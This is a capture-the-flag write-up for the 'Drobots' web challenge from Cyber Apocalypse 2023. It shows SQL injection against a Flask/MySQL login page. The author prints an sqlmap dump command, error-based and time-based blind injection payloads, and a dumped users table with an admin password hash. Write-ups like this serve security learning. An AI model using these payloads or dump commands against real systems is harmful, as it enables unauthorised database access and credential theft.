---
layout: load_md
title: The White Circle | Cyber Apocalypse 2023 | Drobots Writeup
desc: Check out our writeup for Drobots for Cyber Apocalypse 2023 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2023
parent: cyber_apocalypse_2023
category: web
challenge: Drobots
tags: "web, legend, flask, sql, sqli, sqlmap"
date: 2023-03-27T00:00:00+00:00
last_modified_at: 2023-03-27T00:00:00+00:00
---


> Solved by Legend

Challenge description 


> Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?

In this challenge the website is showing a login page.

![](https://i.imgur.com/uxHR1gT.png)


Since no other info was there or in the source code of the page I checked the docker config file.

The website is a `Flask` application running on `MySQL` so I thought of SQL Injection cand be done. Here I found interesting thing that in `config.py` file they have provided the database information.

![](https://i.imgur.com/07ijody.png)


Also in the `database.py` also they have given the hint that the input is not sanitized. 
The logic of the database is that we need the `token` of the password to login. So if we can find the token we can login.

![](https://i.imgur.com/hO6kBee.png)


Then I saved the login request and gave it to `sqlmap` though which I was able to extract the details.


    sqlmap -r ./req --dbms=mysql -D drobots -T users --dump


    ---
    Parameter: JSON username ((custom) POST)
        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: {"username":"a"="a" AND (SELECT 5866 FROM(SELECT COUNT(*),CONCAT(0x7162717071,(SELECT (ELT(5866=5866,1))),0x716a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "a"="a","password":"a"}
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: {"username":"a"="a" AND (SELECT 4022 FROM (SELECT(SLEEP(5)))iMan) AND "a"="a","password":"a"}
    ---


    +----+----------------------------------+----------+
    | id | password                         | username |
    +----+----------------------------------+----------+
    | 1  | 67772d6e54bc393a6f67e16bac3f83da | admin    |
    +----+----------------------------------+----------+

Once logged in we get the flag.

![](https://i.imgur.com/4S5t7zw.png)

